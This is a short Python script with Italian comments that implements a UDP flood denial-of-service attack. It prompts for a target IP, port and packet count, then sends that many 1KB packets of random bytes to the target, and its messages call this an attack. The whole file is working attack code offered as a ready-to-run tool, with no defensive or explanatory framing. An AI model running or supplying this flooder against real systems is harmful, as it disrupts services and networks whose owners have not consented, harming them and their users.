import socket
import random

def udp_flood():
    # Richiesta di input all'utente
    target_ip = input("Inserisci l'indirizzo IP della macchina target: ")
    target_port = int(input("Inserisci il numero di porta UDP della macchina target: "))
    num_packets = int(input("Inserisci il numero di pacchetti da inviare: "))
    packet_size = 1024  # Dimensione dei pacchetti in byte (1KB)

    try:
        # Creazione del socket UDP
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        print(f"Inizio dell'attacco UDP flood su {target_ip}:{target_port}")

        # Creazione di un pacchetto di dati casuali
        packet = random._urandom(packet_size)# Genera dati casuali della dimensione specificata

        for i in range(num_packets):
            sock.sendto(packet, (target_ip, target_port))  # Invio del pacchetto
            print(f"Pacchetto {i + 1}/{num_packets} inviato")

        print("Attacco completato.")
    except Exception as e:
        print(f"Errore: {e}")
    finally:
        sock.close()

if __name__ == "__main__":
    udp_flood()
